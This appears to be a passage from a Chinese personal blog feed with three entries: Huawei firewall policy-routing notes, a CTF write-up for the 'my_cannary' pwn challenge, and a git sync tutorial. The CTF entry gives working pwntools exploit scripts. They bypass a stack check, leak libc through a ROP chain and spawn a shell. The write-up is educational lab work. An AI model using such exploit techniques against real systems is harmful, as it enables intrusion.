title="image-20191130223451969"><blockquote><p>导入ISP地址文件：Web界面操作 网络 &gt; 路由 &gt; 智能选路 &gt; 运营商地址库</p><p>应用： 网络&gt; 接口 &gt; 编辑</p></blockquote><h3 id="可选：健康检查"><a href="#可选：健康检查" class="headerlink" title="可选：健康检查"></a>可选：健康检查</h3><p>探测到无法访问，对应ISP路由会被删除</p><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130223853655.png" class="" title="image-20191130223853655"><h2 id="策略路由应用"><a href="#策略路由应用" class="headerlink" title="策略路由应用"></a>策略路由应用</h2><p>修改名称，配置端口描述</p><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130224518587.png" class="" title="image-20191130224518587"><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130224603119.png" class="" title="image-20191130224603119"><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130224624111.png" class="" title="image-20191130224624111"><h3 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h3><p>配置安全区域</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">interface</span> GE<span class="hljs-number">1</span>/<span class="hljs-number">0</span>/<span class="hljs-number">2</span><br><span class="hljs-attribute">ip</span> address <span class="hljs-number">10.10.1.1</span> <span class="hljs-number">24</span><br><span class="hljs-attribute">quit</span> <br><span class="hljs-attribute">interface</span> GE<span class="hljs-number">1</span>/<span class="hljs-number">0</span>/<span class="hljs-number">3</span><br><span class="hljs-attribute">ip</span> address <span class="hljs-number">10.1.1.1</span> <span class="hljs-number">24</span><br><span class="hljs-attribute">in</span> GE<span class="hljs-number">1</span>/<span class="hljs-number">0</span>/<span class="hljs-number">4</span><br><span class="hljs-attribute">ip</span> add <span class="hljs-number">10.20.1.1</span> <span class="hljs-number">24</span><br><span class="hljs-attribute">firewall</span> zone trust<br><span class="hljs-attribute">set</span> priority <span class="hljs-number">85</span><br><span class="hljs-attribute">add</span> interface GE<span class="hljs-number">1</span>/<span class="hljs-number">0</span>/<span class="hljs-number">3</span><br><span class="hljs-attribute">quit</span><br><span class="hljs-attribute">firewall</span> zone untrust<br><span class="hljs-attribute">set</span> priority <span class="hljs-number">5</span><br><span class="hljs-attribute">add</span> interface GE<span class="hljs-number">1</span>/<span class="hljs-number">0</span>/<span class="hljs-number">2</span><br><span class="hljs-attribute">add</span> interface GE<span class="hljs-number">1</span>/<span class="hljs-number">0</span>/<span class="hljs-number">4</span><br><br></code></pre></td></tr></table></figure><p>配置安全策略</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">security</span>-<span class="hljs-keyword">policy</span><br><span class="hljs-keyword">rule</span> <span class="hljs-type">name</span> policy_sec_sec_trust_untrust<br>source-<span class="hljs-type">zone</span> trust<br>destination-<span class="hljs-type">zone</span> untrust<br>action permit<br>source-address <span class="hljs-number">10.1</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span> <span class="hljs-number">24</span> <br></code></pre></td></tr></table></figure><p>一定要写action，不然默认不允许通过</p><p>配置IP-Link</p><p>目标ip 通过 xx 端口 </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ip</span>-link check enable<br><span class="hljs-attribute">ip</span>-link name pbr_<span class="hljs-number">1</span><br><span class="hljs-attribute">destination</span> <span class="hljs-number">10.10.1.2</span> interface GE <span class="hljs-number">1</span>/<span class="hljs-number">0</span>/<span class="hljs-number">2</span><br><span class="hljs-attribute">quit</span><br><span class="hljs-attribute">ip</span>-link name pbr_<span class="hljs-number">2</span><br><span class="hljs-attribute">destination</span> <span class="hljs-number">10.20.1.2</span> interface GE <span class="hljs-number">1</span>/<span class="hljs-number">0</span>/<span class="hljs-number">4</span><br><br></code></pre></td></tr></table></figure><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130225841573.png" class="" title="image-20191130225841573"><h2 id="故障排查"><a href="#故障排查" class="headerlink" title="故障排查"></a>故障排查</h2><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130225907120.png" class="" title="image-20191130225907120"><p>主要问题多为<strong>域间流量是否放行</strong></p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130230708184.png" class="" title="image-20191130230708184"><p>实验脚本</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">R1</span>:<br><span class="hljs-attribute">sys</span><br><span class="hljs-attribute">sysname</span> r<span class="hljs-number">1</span><br><span class="hljs-attribute">int</span> e<span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">ip</span> add <span class="hljs-number">10.1.1.2</span> <span class="hljs-number">24</span><br><span class="hljs-attribute">des</span> to-pc<span class="hljs-number">1</span>-e<span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br><span class="hljs-attribute">q</span><br><span class="hljs-attribute">int</span> g<span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">ip</span> add <span class="hljs-number">10.10.1.1</span> <span class="hljs-number">24</span><br><span class="hljs-attribute">des</span> to-fw-g<span class="hljs-number">1</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-attribute">q</span><br><span class="hljs-attribute">int</span> e<span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br><span class="hljs-attribute">des</span> to-pc<span class="hljs-number">2</span>-e<span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br><span class="hljs-attribute">ip</span> add <span class="hljs-number">10.1.2.2</span> <span class="hljs-number">24</span><br><br></code></pre></td></tr></table></figure><blockquote><p>Dis cu | in ip-link</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>网络专业知识</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>GXY_CTF_my_cannary-从零记录如何调试出来</title>
    <link href="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/"/>
    <url>/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/</url>
    
    <content type="html"><![CDATA[<p>查看main</p><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223003852267.png" class="" title="image-20191223003852267"><p>进入test()</p><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223003835308.png" class="" title="image-20191223003835308"><p>看见了read，等等先</p><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223005942680.png" class="" title="image-20191223005942680"><p>judge无法反编译，查看汇编</p><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223005319299.png" class="" title="image-20191223005319299"><p>看见了xor rdx,[rbp-8]，以及上图的mov rdx, [rdx] 也就是先讲rdx指针里的数值放在rdx里，再将rdx和rbp-8的那个进行异或，一致则校验成功</p><p>点开read的buf</p><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223005537590.png" class="" title="image-20191223005537590"><p>buf只有30字节</p><p>再看看strings</p><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223011138209.png" class="" title="image-20191223011138209"><p>没有/bin/sh</p><p>所以我们得先绕过栈校验，再leak libc地址，然后再system /bin/sh</p><p>遂写poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = process(<span class="hljs-string">&quot;./my_cannary&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;my_cannary&quot;</span>)<br>lib = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>pop_rdi_ret = <span class="hljs-number">0x0400a43</span><br>start_main = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>__libc_start_main = elf.got[<span class="hljs-string">&quot;__libc_start_main&quot;</span>]<br>sh.recvuntil(<span class="hljs-string">&quot;begin&quot;</span>)<br>payload = cyclic(<span class="hljs-number">0x30</span>)<br>payload += p64(elf.got[<span class="hljs-string">&#x27;exit&#x27;</span>])<br>pause()<br>sh.sendline(payload)<br>sh.interactive()<br>                           <br></code></pre></td></tr></table></figure><blockquote><p>ldd my_cannary 读取libc</p><p>获得pop_rdi_ret 地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">&gt;</span><span class="bash">ROPgadget --binary pwn-100 --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&quot;rdi&quot;</span></span><br></code></pre></td></tr></table></figure></blockquote><p>这里使用got表的exit来放在cannary上，pause之后打开edb调试</p><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223010439895.png" class="" title="image-20191223010439895"><p>运行到这可以看见rdx值为 0x601058 [rdx] = 0x4006f6</p><p>payload += p64(0x4006f6)</p><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223010623917.png" class="" title="image-20191223010623917"><p>这样 rdx 和 [rbp-8] 的值就一样了，异或就为0</p><p>随后</p><p>payload += p64(pop_rdi_ret)<br>payload += p64(start_main)</p><p>测试是否能return to main</p><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223011050308.png" class="" title="image-20191223011050308"><p>可以之后，我们再在pop_rdi_ret之后调用puts 打印libc地址 再return to main函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = process(<span class="hljs-string">&quot;./my_cannary&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;my_cannary&quot;</span>)<br>lib = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>pop_rdi_ret = <span class="hljs-number">0x0400a43</span><br>start_main = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>__libc_start_main = elf.got[<span class="hljs-string">&quot;__libc_start_main&quot;</span>]<br>sh.recvuntil(<span class="hljs-string">&quot;begin&quot;</span>)<br>payload = cyclic(<span class="hljs-number">0x30</span>)<br>payload += p64(elf.got[<span class="hljs-string">&#x27;exit&#x27;</span>])<br>payload += p64(<span class="hljs-number">0x4006f6</span>)<br>payload += p64(pop_rdi_ret)<br>payload += p64(__libc_start_main)<br>payload += p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>payload += p64(start_main)<br>pause()<br>sh.sendline(payload)<br>sh.interactive()<br><br></code></pre></td></tr></table></figure><p>直接运行，报错，也没有打印lbc，打开edb看</p><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223011616461.png" class="" title="image-20191223011616461"><p>这是啥地址，添加log输出之后</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">log.success(<span class="hljs-string">&quot;pop_rdi_ret====&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(pop_rdi_ret))<br>log.success(<span class="hljs-string">&quot;put_plt====&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>log.success(<span class="hljs-string">&quot;__libc_start_main====&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(__libc_start_main))<br>log.success(<span class="hljs-string">&quot;start_main=====&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(start_main))<br></code></pre></td></tr></table></figure><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223011833341.png" class="" title="image-20191223011833341">发现咋跳转到了libc_start_main地址上，本应跳转到pop_rdi_ret的。偏移可能有问题<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = process(<span class="hljs-string">&quot;./my_cannary&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;my_cannary&quot;</span>)<br>lib = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>pop_rdi_ret = <span class="hljs-number">0x0400a43</span><br>start_main = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>__libc_start_main = elf.got[<span class="hljs-string">&quot;__libc_start_main&quot;</span>]<br>sh.recvuntil(<span class="hljs-string">&quot;begin&quot;</span>)<br>payload = cyclic(<span class="hljs-number">0x30</span>)<br>payload += p64(elf.got[<span class="hljs-string">&#x27;exit&#x27;</span>])<br>payload += p64(<span class="hljs-number">0x4006f6</span>)<br>payload += cyclic(<span class="hljs-number">20</span>) <span class="hljs-comment">#计算20个来看偏移</span><br>payload += p64(pop_rdi_ret)<br>payload += p64(__libc_start_main)<br>payload += p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>payload += p64(start_main)<br>log.success(<span class="hljs-string">&quot;pop_rdi_ret====&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(pop_rdi_ret))<br>log.success(<span class="hljs-string">&quot;put_plt====&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>log.success(<span class="hljs-string">&quot;__libc_start_main====&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(__libc_start_main))<br>log.success(<span class="hljs-string">&quot;start_main=====&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(start_main))<br>pause()<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223012131411.png" class="" title="image-20191223012131411"><p>这样就看见了，然后<code>cyclic -l 0x61616163</code>计算得8 </p><p>遂将cyclic20的修改为8 payload += cyclic(8)</p> <img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223012338855.png" class="" title="image-20191223012338855"><p>这样就打印出一堆乱码了，然后写代码接收libc_start_main，计算system和binsh</p><p>Exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = process(<span class="hljs-string">&quot;./my_cannary&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;my_cannary&quot;</span>)<br>lib = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>pop_rdi_ret = <span class="hljs-number">0x0400a43</span><br>start_main = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>__libc_start_main = elf.got[<span class="hljs-string">&quot;__libc_start_main&quot;</span>]<br>sh.recvuntil(<span class="hljs-string">&quot;begin&quot;</span>)<br>payload = cyclic(<span class="hljs-number">0x30</span>)<br>payload += p64(elf.got[<span class="hljs-string">&#x27;exit&#x27;</span>])<br>payload += p64(<span class="hljs-number">0x4006f6</span>)<br>payload += cyclic(<span class="hljs-number">8</span>)<br>payload += p64(pop_rdi_ret)<br>payload += p64(__libc_start_main)<br>payload += p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>payload += p64(start_main)<br>log.success(<span class="hljs-string">&quot;pop_rdi_ret====&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(pop_rdi_ret))<br>log.success(<span class="hljs-string">&quot;put_plt====&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>log.success(<span class="hljs-string">&quot;__libc_start_main====&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(__libc_start_main))<br>log.success(<span class="hljs-string">&quot;start_main=====&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(start_main))<br>pause()<br>sh.sendline(payload)<br>__libc_start_main = u64(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br>log.success(<span class="hljs-string">&quot;__libc_start_main=====&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(__libc_start_main))<br>libc = __libc_start_main - lib.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>system = libc + lib.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc + lib.search(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>).<span class="hljs-built_in">next</span>()<br>payload = cyclic(<span class="hljs-number">0x30</span>)<br>payload += p64(elf.got[<span class="hljs-string">&#x27;exit&#x27;</span>])<br>payload += p64(<span class="hljs-number">0x4006f6</span>)<br>payload += cyclic(<span class="hljs-number">8</span>)<br>payload += p64(pop_rdi_ret)<br>payload += p64(binsh)<br>payload += p64(system)<br>sh.recvuntil(<span class="hljs-string">&quot;begin&quot;</span>)<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure><p>ubuntu18如果运行无法拿shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">payload</span> += p<span class="hljs-number">64</span>(binsh)<br><span class="hljs-attribute">payload</span> += p<span class="hljs-number">64</span>(system + <span class="hljs-number">0</span>x<span class="hljs-number">1</span>b)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>git同步到github和gitee</title>
    <link href="/2020/01/13/git%E5%90%8C%E6%AD%A5%E5%88%B0github%E5%92%8Cgitee/"/>
    <url>/2020/01/13/git%E5%90%8C%E6%AD%A5%E5%88%B0github%E5%92%8Cgitee/</url>
    
    <content type="html"><![CDATA[<p>==按照此说明做下来保证可用，但我也还没完全研究透彻所以有诸多不足请多原谅==</p><h1 id="一、准备工作"><a href="#一、准备工作" class="headerlink" title="一、准备工作"></a>一、准备工作</h1><h2 id="1、建立一个仓库"><a href="#1、建立一个仓库" class="headerlink" title="1、建立一个仓库"></a>1、建立一个仓库</h2><p><a href="https://gitee.com/">https://gitee.com/</a></p><img src="/2020/01/13/git%E5%90%8C%E6%AD%A5%E5%88%B0github%E5%92%8Cgitee/20190802193737452.png" class="" title="在这里插入图片描述"><h2 id="2、下载git"><a href="#2、下载git" class="headerlink" title="2、下载git"></a>2、下载git</h2><p><a href="https://git-scm.com/">https://git-scm.com/</a><br>可以跟随这个 <a href="https://blog.csdn.net/sishen47k/article/details/80211002">https://blog.csdn.net/sishen47k/article/details/80211002</a> 安装</p><h1 id="二、开始操作"><a href="#二、开始操作" class="headerlink" title="二、开始操作"></a>二、开始操作</h1><h2 id="1、创建SSHkey"><a href="#1、创建SSHkey" class="headerlink" title="1、创建SSHkey"></a>1、创建SSHkey</h2><p>打开Git Bash，输入<code>ssh-keygen -t rsa</code><br>会分别提示你文件名，密码（可不设置），确认密码。一般三次回车就可以<br>在 C:\Users\“你的用户名”.ssh 目录下就会有.pub结尾的文件，用记事本打开，复制里面的东西，这就是你的SSH key</p><h2 id="2、添加key到Gitee"><a href="#2、添加key到Gitee" class="headerlink" title="2、添加key到Gitee"></a>2、添加key到Gitee</h2><p>gitee-&gt;设置-&gt;SSH公钥<br>把key粘贴进去，标题默认是本机的名字</p><h2 id="3、git连接到gitee"><a href="#3、git连接到gitee" class="headerlink" title="3、git连接到gitee"></a>3、git连接到gitee</h2><h3 id="https连接"><a href="#https连接" class="headerlink" title="https连接"></a>https连接</h3><p>拷贝下来你仓库的链接，如 <a href="https://gitee.com/xxxxx">https://gitee.com/xxxxx</a><br>然后在你想同步的文件夹上右键<img src="/2020/01/13/git%E5%90%8C%E6%AD%A5%E5%88%B0github%E5%92%8Cgitee/20190802195801320.png" class="" title="在这里插入图片描述"><br>点击GIt Bash Here，输入</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp">git <span class="hljs-keyword">init</span><br>git remote <span class="hljs-keyword">add</span> origin https:<span class="hljs-comment">//gitee.com/xxxxx</span><br></code></pre></td></tr></table></figure><p>add origin的origin是给他的一个命名<br>然后设置config，分别设置名字和邮箱</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs verilog">git <span class="hljs-keyword">config</span> --<span class="hljs-keyword">global</span> user<span class="hljs-variable">.name</span> <span class="hljs-string">&quot;Your Name&quot;</span><br>git <span class="hljs-keyword">config</span> --<span class="hljs-keyword">global</span> user<span class="hljs-variable">.email</span> <span class="hljs-string">&quot;you@example.com&quot;</span><br></code></pre></td></tr></table></figure><h3 id="ssh链接-推荐"><a href="#ssh链接-推荐" class="headerlink" title="ssh链接 ==推荐=="></a>ssh链接 ==推荐==</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">$ssh -T git@gitee.com<br>Hi XXX! You<span class="hljs-symbol">&#x27;ve</span> successfully authenticated, but GITEE.COM does <span class="hljs-keyword">not</span> provide shell <span class="hljs-keyword">access</span>.<br></code></pre></td></tr></table></figure><p>则代表ssh链接成功</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">git remote <span class="hljs-keyword">add</span> gitee git<span class="hljs-title">@gitee.com</span>:YourUserName/YourProjectName.git<br></code></pre></td></tr></table></figure><p>YourUserName和YourProjectName都是要具体看你自己的实际用户名和仓库名字<br>即可，可以通过<code>git remote -v</code>查看</p><p>添加你的文件<code>git add .</code></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">git</span> commit -m <span class="hljs-string">&quot;备注&quot;</span><br></code></pre></td></tr></table></figure><p>推送 <code>git push origin/gitee master</code><br>拉取 <code>git pull origin/gitee master</code> ==使用origin或者gitee取决于你给他的命名==</p><p>==这里的master应该也可以换成develop分支上传==</p><p>深入理解github模式请戳 <a href="https://blog.csdn.net/weixin_33547926/article/details/78545042">https://blog.csdn.net/weixin_33547926/article/details/78545042</a></p><h1 id="3、再次更新之后如何同步"><a href="#3、再次更新之后如何同步" class="headerlink" title="3、再次更新之后如何同步"></a>3、再次更新之后如何同步</h1><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">git status<br>git add -A<br>git commit -a -m <span class="hljs-string">&quot;备注&quot;</span><br>git push origin/gitee <span class="hljs-keyword">master</span> <span class="hljs-title">-f</span><br></code></pre></td></tr></table></figure><h1 id="4、取消暂存"><a href="#4、取消暂存" class="headerlink" title="4、取消暂存"></a>4、取消暂存</h1><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">git <span class="hljs-built_in">status</span><br>git <span class="hljs-built_in">reset</span> filename<br></code></pre></td></tr></table></figure><h1 id="使用VScode更新"><a href="#使用VScode更新" class="headerlink" title="使用VScode更新"></a>使用VScode更新</h1><p>==先保存文件，再暂存更改，随后拉取（pull），即可提交。提交完后再推送到（push）==</p><img 